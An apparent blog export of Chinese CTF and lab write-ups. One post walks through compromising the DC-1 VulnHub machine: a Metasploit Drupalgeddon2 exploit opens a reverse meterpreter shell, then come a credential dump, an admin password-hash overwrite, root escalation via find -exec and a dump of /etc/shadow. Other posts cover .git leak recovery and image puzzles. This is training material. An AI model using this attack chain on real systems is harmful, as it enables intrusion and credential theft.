<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>DC系列靶机</title>
    <url>/2021/05/14/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/</url>
    <content><![CDATA[<script src='https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/js/mouse_snow.min.js'></script>

<h3 id="DC-1"><a href="#DC-1" class="headerlink" title="DC-1"></a>DC-1</h3><p>kali：192.168.126.128                                                靶机：192.168.126.135</p>
<p>先<code>arp-scan -l</code>扫一下ip，再用nmap扫端口<code>nmap -v -A 192.168.126.135</code>或<code>nmap -sV -p-192.168.126.135</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">//nmap -sV -p- 192.168.126.135</span><br><span class="line">┌──(root💀hack)-[~]</span><br><span class="line">└─# nmap -sV -p- 192.168.126.135</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-03 11:48 CST</span><br><span class="line">Nmap scan report for 192.168.126.135</span><br><span class="line">Host is up (0.0010s latency).</span><br><span class="line">Not shown: 65531 closed ports</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp    open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)</span><br><span class="line">80/tcp    open  http    Apache httpd 2.2.22 ((Debian))</span><br><span class="line">111/tcp   open  rpcbind 2-4 (RPC #100000)</span><br><span class="line">34271/tcp open  status  1 (RPC #100024)</span><br><span class="line">MAC Address: 00:50:56:22:CC:DD (VMware)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 17.05 seconds</span><br></pre></td></tr></table></figure>

<p>发现存在web服务，用whatweb扫一下<code>whatweb 192.168.126.135</code>或<code>whatweb -v 192.168.126.135</code>（更详细）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root💀hack)-[~]</span><br><span class="line">└─# whatweb 192.168.126.135 </span><br><span class="line">http://192.168.126.135 [200 OK] Apache[2.2.22], Content-Language[en], Country[RESERVED][ZZ], Drupal, HTTPServer[Debian Linux][Apache/2.2.22 (Debian)], IP[192.168.126.135], JQuery, MetaGenerator[Drupal 7 (http://drupal.org)], PHP[5.4.45-0+deb7u14], PasswordField[pass], Script[text/javascript], Title[Welcome to Drupal Site | Drupal Site], UncommonHeaders[x-generator], X-Powered-By[PHP/5.4.45-0+deb7u14]</span><br></pre></td></tr></table></figure>

<p>发现对应cms为Drupal7，直接上msf（msfconsole）搜索drupal的可用洞</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msf6 &gt; search drupal</span><br><span class="line">                                                                                                                       Matching Modules                                                                                                       ================                                                                                                          #  Name                                           Disclosure Date  Rank       Check  Description                                                                                                                                          </span><br><span class="line">   -  ----                                           ---------------  ----       -----  -----------                        0  exploit/unix/webapp/drupal_coder_exec          2016-07-13       excellent  Yes    Drupal CODER Module Remote Command Execution                                                                                                          1  exploit/unix/webapp/drupal_drupalgeddon2       2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection                                                                                                   </span><br><span class="line">   2  exploit/multi/http/drupal_drupageddon          2014-10-15       excellent  No     Drupal HTTP Parameter Key/Value SQL Injection                                                                                                        </span><br><span class="line">   3  auxiliary/gather/drupal_openid_xxe             2012-10-17       normal     Yes    Drupal OpenID External Entity Injection                                                                                                              </span><br><span class="line">   4  exploit/unix/webapp/drupal_restws_exec         2016-07-13       excellent  Yes    Drupal RESTWS Module Remote PHP Code Execution                                                                                                       </span><br><span class="line">   5  exploit/unix/webapp/drupal_restws_unserialize  2019-02-20       normal     Yes    Drupal RESTful Web Services unserialize() RCE                                                                                                          6  auxiliary/scanner/http/drupal_views_user_enum  2010-07-02       normal     Yes    Drupal Views Module Users Enumeration                                                                                                                7  exploit/unix/webapp/php_xmlrpc_eval            2005-06-29       excellent  Yes    PHP XML-RPC Arbitrary Code Execution                                                                                                                 </span><br><span class="line">                                                                                                                     </span><br><span class="line">Interact with a module by name or index. For example info 7, use 7 or use exploit/unix/webapp/php_xmlrpc_eval </span><br></pre></td></tr></table></figure>

<p>选择时间比较新的利用，这里使用18年对应的那个 </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msf6 &gt; use exploit/unix/webapp/drupal_drupalgeddon2 </span><br><span class="line">[*] No payload configured, defaulting to php/meterpreter/reverse_tcp                                                   msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; show options                                                           Module options (exploit/unix/webapp/drupal_drupalgeddon2):                                                                                                                                                                                   </span><br><span class="line">   Name         Current Setting  Required  Description                                                                                                                                                                                       </span><br><span class="line">   ----         ---------------  --------  -----------                                                                                                                                                                                       </span><br><span class="line">   DUMP_OUTPUT  false            no        Dump payload command output                                                                                                                                                                       </span><br><span class="line">   PHP_FUNC     passthru         yes       PHP function to execute                                                                                                                                                                           </span><br><span class="line">   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]</span><br><span class="line">   RHOSTS                        yes       The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;path&gt;&#x27;</span><br><span class="line">   RPORT        80               yes       The target port (TCP)</span><br><span class="line">   SSL          false            no        Negotiate SSL/TLS for outgoing connections</span><br><span class="line">   TARGETURI    /                yes       Path to Drupal install</span><br><span class="line">   VHOST                         no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line">Payload options (php/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  192.168.126.128  yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             yes       The listen port</span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic (PHP In-Memory)</span><br><span class="line"></span><br><span class="line">msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; set rhost 192.168.126.135</span><br><span class="line">rhost =&gt; 192.168.126.135</span><br><span class="line">msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.126.128:4444 </span><br><span class="line">[*] Executing automatic check (disable AutoCheck to override)</span><br><span class="line">[!] The service is running, but could not be validated.</span><br><span class="line">[*] Sending stage (39282 bytes) to 192.168.126.135</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.126.128:4444 -&gt; 192.168.126.135:40437) at 2021-08-03 11:58:47 +0800</span><br></pre></td></tr></table></figure>

<p><code>rhost对应的是靶机ip</code></p>
<p>接下来出现<code>meterpreter &gt; </code>说明成功执行了exploit</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#弹出交互式teriminal</span><br><span class="line">python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 3485 created.</span><br><span class="line">Channel 0 created.</span><br><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">www-data@DC-1:/var/www$ </span><br></pre></td></tr></table></figure>

<p>先查看当前目录下的文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">www-data@DC-1:/var/www$ ls</span><br><span class="line">ls</span><br><span class="line">LICENSE.txt      flag1.txt    profiles    web.config</span><br><span class="line">COPYRIGHT.txt       MAINTAINERS.txt  includes     robots.txt  xmlrpc.php</span><br><span class="line">INSTALL.mysql.txt   README.txt       index.php    scripts</span><br><span class="line">INSTALL.pgsql.txt   UPGRADE.txt      install.php  sites</span><br><span class="line">INSTALL.sqlite.txt  authorize.php    misc         themes</span><br><span class="line">INSTALL.txt         cron.php         modules      update.php</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>发现了flag1.txt，cat一下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">w-data@DC-1:/var/www$ cat flag1.txt</span><br><span class="line">cat flag1.txt</span><br><span class="line">Every good CMS needs a config file - and so do you.</span><br><span class="line">//大概意思就是要找到对应的config文件</span><br></pre></td></tr></table></figure>

<p>利用find命令找一下settings.php</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">www-data@DC-1:/var/www$ find -name &#x27;settings.php&#x27;</span><br><span class="line">find -name &#x27;settings.php&#x27;</span><br><span class="line">./sites/default/settings.php</span><br><span class="line">www-data@DC-1:/var/www$ cat ./sites/default/settings.php</span><br><span class="line">cat ./sites/default/settings.php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> *</span><br><span class="line"> * flag2</span><br><span class="line"> * Brute force and dictionary attacks aren&#x27;t the</span><br><span class="line"> * only ways to gain access (and you WILL need access).</span><br><span class="line"> * What can you do with these credentials?</span><br><span class="line"> *</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash">databases = array (</span></span><br><span class="line">  &#x27;default&#x27; =&gt; </span><br><span class="line">  array (</span><br><span class="line">    &#x27;default&#x27; =&gt; </span><br><span class="line">    array (</span><br><span class="line">      &#x27;database&#x27; =&gt; &#x27;drupaldb&#x27;,</span><br><span class="line">      &#x27;username&#x27; =&gt; &#x27;dbuser&#x27;,</span><br><span class="line">      &#x27;password&#x27; =&gt; &#x27;R0ck3t&#x27;,</span><br><span class="line">      &#x27;host&#x27; =&gt; &#x27;localhost&#x27;,</span><br><span class="line">      &#x27;port&#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">      &#x27;driver&#x27; =&gt; &#x27;mysql&#x27;,</span><br><span class="line">      &#x27;prefix&#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">    ),</span><br><span class="line">  ),</span><br><span class="line">);</span><br><span class="line">……</span><br></pre></td></tr></table></figure>

<p>在这里发现了flag2，大概意思是<strong>暴力和字典攻击并不是获得访问权限的唯一方法（而且你需要访问权限），你将如何处理这些数据？</strong>在文件中还看到了数据库的相关信息并且给出了一个低权限的账号，先查看一下数据库。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; show databases;</span><br><span class="line">show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| drupaldb           |</span><br><span class="line">+--------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; use drupaldb</span><br><span class="line">use drupaldb</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; show tables;</span><br><span class="line">show tables;</span><br><span class="line">+-----------------------------+</span><br><span class="line">| Tables_in_drupaldb          |</span><br><span class="line">+-----------------------------+</span><br><span class="line">| ......                      |</span><br><span class="line">| users                       |</span><br><span class="line">| ......                      |</span><br><span class="line">+-----------------------------+</span><br><span class="line">80 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users;</span><br><span class="line">select * from users;</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>uid</th>
<th>name</th>
<th>pass</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>admin</td>
<td>$S$DxQCTfic1drhqY7jbCf62drw/T204r3is./KmIUKEzlQUpfHx1RQ</td>
</tr>
<tr>
<td>2</td>
<td>Fred</td>
<td>$S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg</td>
</tr>
</tbody></table>
<p>users表中有两个账户，但是密码经过加密无法查看，可以结合drupal的机密文件来修改密码。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">www-data@DC-1:/var/www$ cd scripts</span><br><span class="line">cd scripts</span><br><span class="line">www-data@DC-1:/var/www/scripts$ cp -r ../includes ./</span><br><span class="line">cp -r ../includes ./</span><br><span class="line">www-data@DC-1:/var/www/scripts$ ls</span><br><span class="line">ls</span><br><span class="line">code-clean.sh  drupal.sh            generate-d6-content.sh  password-hash.sh</span><br><span class="line">cron-curl.sh   dump-database-d6.sh  generate-d7-content.sh  run-tests.sh</span><br><span class="line">cron-lynx.sh   dump-database-d7.sh  includes                test.script</span><br><span class="line">www-data@DC-1:/var/www/scripts$ ./password-hash.sh t0mr</span><br><span class="line">./password-hash.sh t0mr</span><br><span class="line"></span><br><span class="line">password: t0mr          hash: $S$DXk.TovSUw5QaQCopN17mumoRyldcf.UDXd40tEI5QluWgHqMQmA</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>接下来去数据库中更新密码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; update users set pass &#x3D; &#39;$S$DXk.TovSUw5QaQCopN17mumoRyldcf.UDXd40tEI5QluWgHqMQmA&#39; where name &#x3D; &#39;admin&#39;;</span><br><span class="line">&lt;17mumoRyldcf.UDXd40tEI5QluWgHqMQmA&#39; where name &#x3D; &#39;admin&#39;;                   </span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line">Rows matched: 1  Changed: 1  Warnings: 0</span><br></pre></td></tr></table></figure>

<p>这时候就可以回去登陆了</p>
<p>在dashboard看到了flag3，内容是：**Special PERMS will help FIND the passwd - but you’ll need to -exec that command to work out how to get what’s in the shadow.**大概意思是告诉我需要怎么找到密码，但是需要exec和shadow。</p>
<p>点击flag3后，关注点放到passwd文件和shadow文件。Linux为了考虑安全性，用单独的shadow文件存储Linux用户的密码信息，并且只有root用户有权限读取此文件。所以下一步，我们要考虑的是提权了。<br>采用find提权。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">www-data@DC-1:/var/www/scripts$ touch 123</span><br><span class="line">touch 123</span><br><span class="line">www-data@DC-1:/var/www/scripts$ find / -name 123 -exec &quot;whoami&quot; \;</span><br><span class="line">find / -name 123 -exec &quot;whoami&quot; \;</span><br><span class="line">root</span><br><span class="line">www-data@DC-1:/var/www$ find / -name 123 -exec &quot;/bin/sh&quot; \;</span><br><span class="line">find / -name 123 -exec &quot;/bin/sh&quot; \;</span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">cd</span> /root</span></span><br><span class="line">cd /root</span><br><span class="line"><span class="meta">#</span><span class="bash"> </span></span><br></pre></td></tr></table></figure>

<p>提权成功后，查看shadow文件。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> cat /etc/shadow</span></span><br><span class="line">cat /etc/shadow</span><br><span class="line">root:$6$rhe3rFqk$NwHzwJ4H7abOFOM67.Avwl3j8c05rDVPqTIvWg8k3yWe99pivz/96.K7IqPlbBCmzpokVmn13ZhVyQGrQ4phd/:17955:0:99999:7:::</span><br><span class="line">daemon:*:17946:0:99999:7:::</span><br><span class="line">bin:*:17946:0:99999:7:::</span><br><span class="line">sys:*:17946:0:99999:7:::</span><br><span class="line">sync:*:17946:0:99999:7:::</span><br><span class="line">games:*:17946:0:99999:7:::</span><br><span class="line">man:*:17946:0:99999:7:::</span><br><span class="line">lp:*:17946:0:99999:7:::</span><br><span class="line">mail:*:17946:0:99999:7:::</span><br><span class="line">news:*:17946:0:99999:7:::</span><br><span class="line">uucp:*:17946:0:99999:7:::</span><br><span class="line">proxy:*:17946:0:99999:7:::</span><br><span class="line">www-data:*:17946:0:99999:7:::</span><br><span class="line">backup:*:17946:0:99999:7:::</span><br><span class="line">list:*:17946:0:99999:7:::</span><br><span class="line">irc:*:17946:0:99999:7:::</span><br><span class="line">gnats:*:17946:0:99999:7:::</span><br><span class="line">nobody:*:17946:0:99999:7:::</span><br><span class="line">libuuid:!:17946:0:99999:7:::</span><br><span class="line">Debian-exim:!:17946:0:99999:7:::</span><br><span class="line">statd:*:17946:0:99999:7:::</span><br><span class="line">messagebus:*:17946:0:99999:7:::</span><br><span class="line">sshd:*:17946:0:99999:7:::</span><br><span class="line">mysql:!:17946:0:99999:7:::</span><br><span class="line">flag4:$6$Nk47pS8q$vTXHYXBFqOoZERNGFThbnZfi5LN0ucGZe05VMtMuIFyqYzY/eVbPNMZ7lpfRVc0BYrQ0brAhJoEzoEWCKxVW80:17946:0:99999:7:::</span><br><span class="line"><span class="meta">#</span><span class="bash"> </span></span><br></pre></td></tr></table></figure>

<p>接着看一下密码文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> cat /etc/passwd</span></span><br><span class="line">cat /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/bin/sh</span><br><span class="line">bin:x:2:2:bin:/bin:/bin/sh</span><br><span class="line">sys:x:3:3:sys:/dev:/bin/sh</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/bin/sh</span><br><span class="line">man:x:6:12:man:/var/cache/man:/bin/sh</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/bin/sh</span><br><span class="line">mail:x:8:8:mail:/var/mail:/bin/sh</span><br><span class="line">news:x:9:9:news:/var/spool/news:/bin/sh</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh</span><br><span class="line">proxy:x:13:13:proxy:/bin:/bin/sh</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/bin/sh</span><br><span class="line">backup:x:34:34:backup:/var/backups:/bin/sh</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/bin/sh</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/bin/sh</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/bin/sh</span><br><span class="line">libuuid:x:100:101::/var/lib/libuuid:/bin/sh</span><br><span class="line">Debian-exim:x:101:104::/var/spool/exim4:/bin/false</span><br><span class="line">statd:x:102:65534::/var/lib/nfs:/bin/false</span><br><span class="line">messagebus:x:103:107::/var/run/dbus:/bin/false</span><br><span class="line">sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin</span><br><span class="line">mysql:x:105:109:MySQL Server,,,:/nonexistent:/bin/false</span><br><span class="line">flag4:x:1001:1001:Flag4,,,:/home/flag4:/bin/bash</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>先去home下查看一下flag4</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">cd</span> /home/flag4</span></span><br><span class="line">cd /home/flag4</span><br><span class="line"><span class="meta">#</span><span class="bash"> ls</span></span><br><span class="line">ls</span><br><span class="line">flag4.txt</span><br><span class="line"><span class="meta">#</span><span class="bash"> cat flag4.txt</span></span><br><span class="line">cat flag4.txt</span><br><span class="line">Can you use this same method to find or access the flag in root?</span><br><span class="line"></span><br><span class="line">Probably. But perhaps it&#x27;s not that easy.  Or maybe it is?</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>提醒要用root查看。</p>
<p>在shadow中发现flag4是一个账户。可能是ssh账户，不知道咋破解。。看了大佬的文章后知道密码是orange。。。emm其实没啥用，flag4.txt在root文件夹下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">cd</span> /root</span></span><br><span class="line">cd /root</span><br><span class="line"><span class="meta">#</span><span class="bash"> ls</span></span><br><span class="line">ls</span><br><span class="line">thefinalflag.txt</span><br><span class="line"><span class="meta">#</span><span class="bash"> cat the?????????.???</span> </span><br><span class="line">cat the?????????.???</span><br><span class="line">Well done!!!!</span><br><span class="line"></span><br><span class="line">Hopefully you&#x27;ve enjoyed this and learned some new skills.</span><br><span class="line"></span><br><span class="line">You can let me know what you thought of this little journey</span><br><span class="line">by contacting me via Twitter - @DCAU7</span><br></pre></td></tr></table></figure>

<p>DC-1至此就结束了<br>$$</p>
<p>$$</p>
]]></content>
      <categories>
        <category>内网靶机练习</category>
      </categories>
  </entry>
  <entry>
    <title>ctfhub 技能树 .git泄露</title>
    <url>/2021/05/15/ctfhub_.git/</url>
    <content><![CDATA[<script src='https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/js/mouse_snow.min.js'></script>

<h2 id="Log"><a href="#Log" class="headerlink" title="Log"></a>Log</h2><p>直接访问url/.git 不行</p>
<p>在kali里命令行运行👇进行文件恢复</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python2 GitHack.py url/.git</span><br></pre></td></tr></table></figure>

<p>进入dist目录中刚刚恢复的文件夹内，读取git日志👇</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git log</span><br></pre></td></tr></table></figure>

<p>得到👇</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">commit 13321dfebe7b705300f9d808b2eedb839a49be24 (HEAD -&gt; master)</span><br><span class="line">Author: CTFHub &lt;sandbox@ctfhub.com&gt;</span><br><span class="line">Date:   Sat May 15 13:46:29 2021 +0000</span><br><span class="line"></span><br><span class="line">    remove flag</span><br><span class="line"></span><br><span class="line">commit 10ec2f5284a6f063ba9575f16115289c952b9720</span><br><span class="line">Author: CTFHub &lt;sandbox@ctfhub.com&gt;</span><br><span class="line">Date:   Sat May 15 13:46:29 2021 +0000</span><br><span class="line"></span><br><span class="line">    add flag</span><br><span class="line"></span><br><span class="line">commit 59443cdfbb4da7e591fb939e829255a5d6afd238</span><br><span class="line">Author: CTFHub &lt;sandbox@ctfhub.com&gt;</span><br><span class="line">Date:   Sat May 15 13:46:29 2021 +0000</span><br><span class="line"></span><br><span class="line">    init</span><br></pre></td></tr></table></figure>

<p>接下来恢复到<code>add flag</code>对应的版本即可👇</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git reset --hard 10ec2f5284a6f063ba9575f16115289c952b9720</span><br></pre></td></tr></table></figure>

<p>在文件夹中即可发现含有flag的txt文件</p>
<h2 id="Stash"><a href="#Stash" class="headerlink" title="Stash"></a>Stash</h2><p><a href="https://www.cnblogs.com/tocy/p/git-stash-reference.html">参考文章</a></p>
<p>按照Log中的操作，回到<code>add flag</code>的版本，发现并没有flag</p>
<p>结合这关考察的知识，使用<code>git stash list</code>发现有<code>add flag</code>👇</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git stash list                                           </span><br><span class="line">stash@&#123;0&#125;: WIP on master: f16bcee add flag</span><br></pre></td></tr></table></figure>

<p>使用<code>git stash apply</code> 或者<code>git stash pop</code>命令，可以发现目录下那个txt文件被修改了，打开就是flag</p>
<h2 id="index"><a href="#index" class="headerlink" title="index"></a>index</h2><p>重复上述步骤，到用git log查看历史记录</p>
<p>直接恢复到<code>add flag</code>的版本即可发现flag</p>
<p>但是，这显然不是想要考察的知识点。</p>
<p>回溯到git log查看历史记录部分</p>
<p>使用👇</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git diff 07b1d09050b04694f6a9b7f86b52b767041a9a84（这一串是add flag 对应的那串</span><br></pre></td></tr></table></figure>

<p>即可看到flag</p>
<p>或者使用<code>git checkout</code>命令查询输出文件👇</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git checkout</span><br><span class="line"></span><br><span class="line">git checkout -b 200544546585.txt</span><br></pre></td></tr></table></figure>

<p>发现文件夹下出现一个txt文件，在txt文件中可看到flag</p>
<p>命令解释</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">创建新分支：git branch name</span><br><span class="line">切换到新分支：git checkout name</span><br><span class="line">也可以合成为一个命令：</span><br><span class="line">git checkout -b name</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>web学习</category>
      </categories>
  </entry>
  <entry>
    <title>csictf2020 panda wp</title>
    <url>/2021/05/14/csictf-misc-panda/</url>
    <content><![CDATA[<script src='https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/js/mouse_snow.min.js'></script>



<p>附件为zip压缩包 <a href="https://pan.baidu.com/s/1zkkhvzW4ORqCRsB-c7myGA">T0MR</a>（附件下载</p>
<p>爆破压缩包–&gt;密码为 2611</p>
<p>打开后得到两个有部分不一样jpg图片</p>
<p>python解密脚本👇</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(i) <span class="keyword">for</span> i, j <span class="keyword">in</span> <span class="built_in">zip</span>(<span class="built_in">open</span>(<span class="string">&#x27;panda1.jpg&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read(), <span class="built_in">open</span>(<span class="string">&#x27;panda.jpg&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()) <span class="keyword">if</span> i!= j]))</span><br><span class="line"></span><br><span class="line"><span class="comment">#读取图片的单个字节进行比对，不同的话输出相应的字符</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#-----------------------------------------</span></span><br><span class="line"><span class="comment">#csictf&#123;kung_fu_p4nd4&#125;</span></span><br></pre></td></tr></table></figure>

<p>有关知识👇</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">join() 方法用于将序列中的元素以指定的字符连接生成一个新的字符串</span><br><span class="line"><span class="built_in">zip</span>() 函数用于将可迭代的对象作为参数，将对象中对应的元素打包成一个个元组，然后返回由这些元组组成的列表</span><br><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)以二进制格式打开一个文件(一般为非文本)用于只读</span><br><span class="line">read() 方法默认参数为-<span class="number">1</span>，即读取整个文件</span><br><span class="line"></span><br><span class="line">脚本思路：分别打开panda1.jpg 和 panda.jpg 读取每个字节，并将这两个文件的字节数据依次打包为元组，用<span class="keyword">for</span>循环遍历元组，对比元组中每一组的两个数据是否相同，不相同的话就返回对应的panda1.jpg 中对应的字节转化为字符用join()方法连接成字符串输出.</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Misc</category>
      </categories>
  </entry>
  <entry>
    <title>ctfshow_misc入门  WP（未完）</title>
    <url>/2021/05/11/ctfshow_misc_ru/</url>
    <content><![CDATA[<script src='https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/js/mouse_snow.min.js'></script>



<h2 id="图片篇-基础操作"><a href="#图片篇-基础操作" class="headerlink" title="图片篇(基础操作)"></a>图片篇(基础操作)</h2><h3 id="misc1"><a href="#misc1" class="headerlink" title="misc1"></a>misc1</h3><p>没啥好说的，打开图片就是flag</p>
<h3 id="misc2"><a href="#misc2" class="headerlink" title="misc2"></a>misc2</h3><p>附件是txt文本，用010editor打开，发现16进制对应的是png的文件头，修改后缀名misc2.txt–&gt;misc.png，打开图片就可以看到flag了</p>
<h3 id="misc3"><a href="#misc3" class="headerlink" title="misc3"></a>misc3</h3><p>解压后是一个bpg文件，在<a href="https://bellard.org/bpg/">网站</a>下载bpg文件查看器，解压后，用bpgview.exe打开misc3.bpg即可看见flag</p>
<h3 id="misc4"><a href="#misc4" class="headerlink" title="misc4"></a>misc4</h3><p>给了6个txt文件，分别用010editor打开，看开头的16进制，找对应图片格式的文件头，依次改为png、jpg、bmp、gif、tif、webp之后将图片中的字符串拼接一下就可以得到flag了</p>
<p>成品：<a href="https://pan.baidu.com/s/1Iz-HL2t5me3EfiZ2auGOFg">T0MR</a></p>
<h2 id="图片篇-信息附加"><a href="#图片篇-信息附加" class="headerlink" title="图片篇(信息附加)"></a>图片篇(信息附加)</h2><h3 id="misc5"><a href="#misc5" class="headerlink" title="misc5"></a>misc5</h3><p>打开附件，图片上写着<code>there_is_no_flag_here</code><del>而且图片为900x150像素，很明显图片的高度被缩小了</del>（当我修改完高度之后发现，我错了）用010editor打开之后滑到最下边即可看到flag</p>
<h3 id="misc6"><a href="#misc6" class="headerlink" title="misc6"></a>misc6</h3><p>用010editor打开搜索文本ctfshow，即可发现flag（这题是藏到中间了</p>
<h3 id="misc7"><a href="#misc7" class="headerlink" title="misc7"></a>misc7</h3><p>题目上给了提示<code>flag在图片文件信息中</code> <del>好嘛</del>，还是在010editor中搜索文本就完事。。</p>
<h3 id="misc8"><a href="#misc8" class="headerlink" title="misc8"></a>misc8</h3><p>题目给提示<code>flag在图片文件中图片文件中</code> 那就是个套娃呗，用010editor打开可以发现有两个png文件的文件头，把后边的png文件分离出来就可以了</p>
<p>方法：找到第二个png文件头<code>89 50 4E 47</code> 将从这儿开始一直到结尾的16进制文本复制到一个新建文本文档里边，之后在010中点左上角  文件–&gt;导入16进制文本–&gt;选中刚才导出的文本–&gt;保存为png文件–&gt;即可看到flag（复制16进制文本方法：选中之后找左上角的编辑–&gt;复制–&gt;复制为16进制文本）</p>
<h3 id="misc9"><a href="#misc9" class="headerlink" title="misc9"></a>misc9</h3><p>题目给的hint<code>flag在图片块里</code> 直接010打开，搜索一下ctfshow就行。</p>
<p>预期解应该是👇</p>
<p><img src="https://img.vim-cn.com/a1/c461bd18824075954430e81821aa105703e7fd.png" alt="misc9"></p>
<h3 id="misc10"><a href="#misc10" class="headerlink" title="misc10"></a>misc10</h3><p>题目hint<code>flag在图片数据里</code> 用kali的binwalk分离出数据👇</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">binwalk -e misc10.png</span><br></pre></td></tr></table></figure>

<p>生成一个文件夹👇</p>
